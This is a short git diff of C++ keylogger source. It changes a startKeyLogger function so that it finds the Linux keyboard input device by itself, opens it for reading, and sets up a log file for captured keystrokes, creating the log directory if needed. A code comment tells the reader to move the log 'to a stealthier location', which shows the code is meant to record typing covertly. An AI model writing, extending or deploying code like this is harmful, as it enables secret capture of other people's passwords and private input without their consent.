@@ -5,12 +5,24 @@
 #include "keyboard_utils.hpp"
 #include <fstream>
 #include <iostream>
+#include <filesystem>
 #include <fcntl.h>
 #include <unistd.h>
 #include <cstring>
 #include <linux/input.h>
 
-bool startKeyLogger(const std::string& devicePath, const std::string& logPath) {
+bool startKeyLogger() {
+    std::string devicePath = get_device_name();
+    std::filesystem::path logPath = "logs/keylog.txt"; // change this to a stealthier location
+
+    std::filesystem::path dir = logPath.parent_path();
+    if (!dir.empty() && !std::filesystem::exists(dir)){
+        if(!std::filesystem::create_directories(dir)){
+            std::cerr << "Failed to create log directory." << std::endl;
+            return false;
+        }
+    }
+
     int fd = open(devicePath.c_str(), O_RDONLY);
     if (fd == -1) {
         std::cerr << "Cannot open " << devicePath << std::endl;
